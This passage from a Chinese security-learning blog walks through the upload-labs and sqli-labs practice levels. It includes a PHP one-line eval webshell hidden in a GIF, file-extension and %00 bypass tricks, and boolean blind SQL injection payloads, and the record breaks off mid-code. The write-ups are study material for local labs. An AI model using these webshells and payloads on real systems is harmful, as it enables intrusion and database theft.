punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>好多被限制的额，但是没有限制<code>.htaccess</code>文件。然后就可以上传这个文件。<br>这之前，需要进行一些改动，在apache解析那个文件中，检查mod_write模块是否开启，还有<code>AllowOverride All</code><br>先上传一个<code>1.htaccess</code>文件，</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>jpg</code></pre><p>然后上传shell.jpg就可以尝试用蚁剑菜刀等工具连接了。<br>伤心事一笔带过。=_=</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>这个再上传htaccess文件已经不可以了，也被过滤了，所以看看源码。<br><img src="https://img-blog.csdnimg.cn/202005111627009.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>莫明的想笑，我的第五关跟别人的不一样，直接基础的过滤都给省略了，（大小写绕过，点绕过，空格绕过）<br>这里直接综合使用：<br>先将php文件上传抓包，<br><img src="https://img-blog.csdnimg.cn/20200511163223684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>它要过滤，那就制造给它过滤，让它先过滤空格和点，最后还剩下点，依旧能上传，尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200511163503549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>OK，阔以。</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>呃呃呃，我发现这个是大小写过滤，，，怎么到后面来了，<br>这个就是将<code>shell.php</code>上传抓包改后缀为<code>Php</code>就可以绕过了。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>空格绕过，这个在<code>shell.php</code>后加个空格就OK了，<br>抓包改成<code>shell.php </code>上传。</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>点过滤，抓包，修改后缀为<code>shell.php.</code>，即可进行点过滤。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><code>::$DATA</code>绕过,</p><blockquote><p><code>在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过</code></p></blockquote><p>这是网上的大佬给的解释，简单明了。容易理解。<br>还是抓包修改<br><img src="https://img-blog.csdnimg.cn/20200511170305633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试连接，看到连接成功了。<br><img src="https://img-blog.csdnimg.cn/20200511170350369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>eeee,第十关好像跟第五关一样了，？？？<br><img src="https://img-blog.csdnimg.cn/20200511170652283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>仔细对比了一下，源码都一样的，=_=，直接过了哈。</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>查看源码可以看出,这里使用了替换函数。<br><img src="https://img-blog.csdnimg.cn/20200511171014758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>试一下，这里我加个点，尝试点绕过。<br><img src="https://img-blog.csdnimg.cn/20200511171142217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后复制图像地址看一下。<br><img src="https://img-blog.csdnimg.cn/20200511171524604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>再看看upload的文件夹<br><img src="https://img-blog.csdnimg.cn/20200511171328208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这里知道它是将php替换成”空格”了。<br>嗯，这里可以进行双写绕过……<br><img src="https://img-blog.csdnimg.cn/20200511171753880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试连接，连接成功<br><img src="https://img-blog.csdnimg.cn/20200511171839344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-12-00截断Get"><a href="#Pass-12-00截断Get" class="headerlink" title="Pass-12 %00截断Get"></a>Pass-12 %00截断Get</h2><p><img src="https://img-blog.csdnimg.cn/20200511174326316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>代码解析;<br>这个是对服务器端上传文件名的后缀做了限制，<br>这里没有设置黑名单，而是白名单，规定只能上传jpg/png/gif格式的图片。<br><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>可知上传路径命名规则使用用户get请求的save_path值拼接而成。<br>可以考虑%00截断，但是好像php%00截断只对php版本&lt;5.3的适用，我的是5.4，不知道行不行，试一下吧。<br>抓包进行修改。<br><img src="https://img-blog.csdnimg.cn/20200511175244701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>果然不行，上传出错了。<br><img src="https://img-blog.csdnimg.cn/2020051117533873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>切换到5.3的版本应该就行了。</p><h2 id="Pass-13-00截断POST"><a href="#Pass-13-00截断POST" class="headerlink" title="Pass-13 00截断POST"></a>Pass-13 00截断POST</h2><p>查看源码发现是基于post的save_path，做题如何判断是get还是post，抓包查看save_path在什么位置，在上面的url的位置上就是get，如下的情况就是post。<br><img src="https://img-blog.csdnimg.cn/20200511182305466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>修改，因为是post方式，它与get方式不同的就是，它不会对%00自动进行解码，所以在二进制中修改。<br><img src="https://img-blog.csdnimg.cn/20200511182409426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/2020051118260279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>测试连接，可以连上。<br><img src="https://img-blog.csdnimg.cn/20200511182855402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="Pass-14图片马"><a href="#Pass-14图片马" class="headerlink" title="Pass-14图片马"></a>Pass-14图片马</h2><p><img src="https://img-blog.csdnimg.cn/20200512090543515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>制作图片shell</p><pre class="language-php" data-language="php"><code class="language-php">GIF98A<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>然后改为图片格式的后缀。<br>上传……<br><img src="https://img-blog.csdnimg.cn/20200512093100951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后，提示有文件包含漏洞，可以查看一下。<br><img src="https://img-blog.csdnimg.cn/20200512093153787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>关于文件包含漏洞，之前学习上传图片马，然后了解了一下文件包含漏洞，具体学习的博客正在写了，完善完成后发。<br>这里直接利用。<br>构造payload</p><pre class="language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;include.php?file&#x3D;4420200512095517.gif</code></pre><p><img src="https://img-blog.csdnimg.cn/2020051209391194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>访问，可以。<br>尝试蚁剑连接。<br><img src="https://img-blog.csdnimg.cn/20200512094009859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>终于成功了，get。<br>注意事项：<code>include.php</code>必须在upload目录下，或者这么说：<code>include.php</code>必须和上传的文件(图片马)在同一目录下。</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>继续上传刚才的图片马(上一关上传的我已经删除了)<br>成功了，测试连接，也可以<br><img src="https://img-blog.csdnimg.cn/20200512095949200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这关是，用getimagesize函数判断文件类型图片马没什么影响。可以使用。</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>已久传了我百传不厌的“图片”，发现依旧管用。<br><img src="https://img-blog.csdnimg.cn/20200512101250421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看源码：<br><img src="https://img-blog.csdnimg.cn/20200512101819686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看后发现我已经是开着这个模块的。所以才成功了，<br>考点：使用php_exif模块来判断文件类型，已久可以使用图片马。</p><h2 id="Pass-17二次渲染"><a href="#Pass-17二次渲染" class="headerlink" title="Pass-17二次渲染"></a>Pass-17二次渲染</h2><p>这一关有所变化，<img src="https://img-blog.csdnimg.cn/20200512102044331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个图片马不管用了，那就再换一个。<br>之前记得学过将php一句话与正常图片拼接成一个图片马。在硬盘角落里找到了它。<br>还是再写一遍制作方法：使用windows命令中的copy</p><pre class="language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg&#x2F;b+shell.php&#x2F;a 1000.jpg</code></pre><p>就可以生成图片马了。<br>上传……<br><img src="https://img-blog.csdnimg.cn/20200512102547291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后发现找不到我的一句话了。<br><img src="https://img-blog.csdnimg.cn/20200512105346939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>按理说，我的一句话应该是在这里的，不见了。查过资料发现是进行了二次渲染。<br>查看源码：<br><img src="https://img-blog.csdnimg.cn/20200512105528292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>上面还进行了判断content-type还有后缀等。二次渲染不知道怎么绕过。看看大佬的文章，没有随便转载和复现，感觉大佬写的很详细，下次再看直接去看原创。留个门：<a href="https://xz.aliyun.com/t/2657#toc-13">传送门</a><br>php一句话被写在了中间的位置，也不是随便挑的位置。有方法去写的。</p><p>到此先停下，这个二次渲染已经不会了，后面的也先不看了。看不定还浪费时间。等水平提高一点了再把这个靶场过完。</p><p>文末寄语：</p><blockquote><p>有时想想，独居斗室和天涯浪迹好像是一件事情，身处寂寞和身处喧嚣其实也没什么两样，身外的整个世界都是镜子，我们必须自己认得自己。<br> ——马良《人间卧底》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是布尔盲注？学到了</title>
      <link href="/posts/ba5b0432/"/>
      <url>/posts/ba5b0432/</url>
      
        <content type="html"><![CDATA[<p>周一晚上学长给我们讲了布尔盲注。</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注为什么叫布尔盲注，看下概念</p><blockquote><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。</p></blockquote><blockquote><p>基于布尔的盲注<br>Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。</p></blockquote><p>明白了，True和False都是布尔类型，这个在Python里会经常用到。<br>1.布尔盲注利用前提：<br>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入<br>缺点：速度太慢，消耗大量时间<br>2.布尔盲注常用函数：<br>length（）函数 返回字符串的长度<br>ascii( )函数<br>作用：返回字符串str的字符ASCII码值。如果str是空字符串，返回0.如果string是 NULL,返回NULL。<br>substr()函数 用来截取字符串，其中有三个参数，可以自定义要截取的字符串，截取的起点位置和截取的长度。<br>基本概念就说这么多，下面开始实战试试</p><h4 id="The-fifth"><a href="#The-fifth" class="headerlink" title="The fifth"></a>The fifth</h4><p>我看到有好几种方法，手工型盲注的，借助工具的等等。这里我都列举下来。<br><strong>手工注入：</strong><br>第一步不变，照样是判断闭合符号</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>'</code></pre><p><img src="https://img-blog.csdnimg.cn/2020030313233131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>根据这里的报错，判断应该是单引号闭合<br><img src="https://img-blog.csdnimg.cn/20200303132452144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>果然是对的，页面返回了<code>You are in……</code>代表True，如果没有回显就是False。<br>第二步：<br>判断列数</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>' order by <span class="token number">3</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200303210636541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>只有三列，还跟之前一样。第四页就没有了。可以自己试一下。这里不再放图了。<br>第三步：<br>判断库名的长度</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">and</span> length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200303205632827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个就是猜它的库名长度。别问为什么是8。<br>第四步：<br>手工注入时可使用例如<code>left((select database()),1)&lt;&#39;t&#39;</code>  这样的比较二分查找方法快速爆破,开始爆库</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left((select database()),1)='</span>s'<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200303204220542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>解读下这个句子，<code>left((select database()),1)</code>意思是数据库的名字从左边数的第一位，上面那个就是判断该数据库的名字第一个字母是不是s，我giao肯定有人不明白为什么要让它等于s，我一开始也不懂，直说吧，我也不是猜的，我是试出来的<br><img src="https://img-blog.csdnimg.cn/20200303203939828.jpg" alt="在这里插入图片描述" loading="lazy"><br>不过也不是挨个的傻不拉几的去试，二分法就很好，能减少“工作量”，二分法不明白百度看看吧，<br>想到这里我就莫名的想笑，有工具不用，非纠结个这，废了我好长时间。<br><img src="https://img-blog.csdnimg.cn/20200303204430292.jpg" alt="在这里插入图片描述" loading="lazy"><br>接着试，这个布尔盲注就是一个机器人，只会说是或者不是，</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and right((select database()),1)='</span>y'<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200303204857876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>事实证明这个可行，就是太费劲，贼费劲。对了，我当时看这个方法的时候，还有一个想法就是，我能不能把这个1换成其他数字，我原本以为它能换，我试了一下，发现不行！！！！！！可能是我的打开方式不对，总之这个是能打开的，我当时的错的操作步骤我忘了，现在，我可以肯定的说，可以。这个手注方法，是我看一个大佬的博客学的，看的很懵逼，因为这位大佬，他没有多加解释，我这种学习CTF两天半的小白看起来很费劲，有好多不理解的地方，有好多为什么想问，我经过好多次的尝试，算是明白啦怎么操作这个语句。一起看下：</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left((select database()),2)='</span>se' <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>如果这样回显是正确的。其他的自行拓展。<br>手注终究是太麻烦了，理解原理就够了，实际做题应该用不上。</p><pre class="language-python" data-language="python"><code class="language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='</span>users' <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p>limit x,1值得是可以吧x换成其他值，而这个其他值也不是随便改的，最大不能超过你用order by 查出来的那个列数。<br>疑惑点也解决了，接下来就不详细说了。步骤就都是这样的。</p><h5 id="借助工具注入"><a href="#借助工具注入" class="headerlink" title="借助工具注入"></a>借助工具注入</h5><p>这个都喜欢，嘿嘿，用burp进行盲注<br>这个不知道为什么，我的工具抓不到sqli-labs网站的包，总是抓到一些其他的网站，我也是无语了。就试试其他的题。<br>先随意写账户密码，抓包。<br><img src="https://img-blog.csdnimg.cn/20200308125414988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>抓到包之后，看到了usename<br>测试闭合符号<br>右键单击，选择<code>Send to Repeater</code><br>1.单引号</p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200308130216649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>单引号错误，继续试双引号<br><img src="https://img-blog.csdnimg.cn/20200308130607695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>对了，但是没有flag，也是，如果有的话，那就变成万能密码了！！！<br>数据库<br>上面可以证明闭合符号是双引号，<br>先测试数据库名的长度</p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1234</span></code></pre><p>试试其他的，盲注的话，最好用二分法，再试试10</p><pre class="language-python" data-language="python"><code 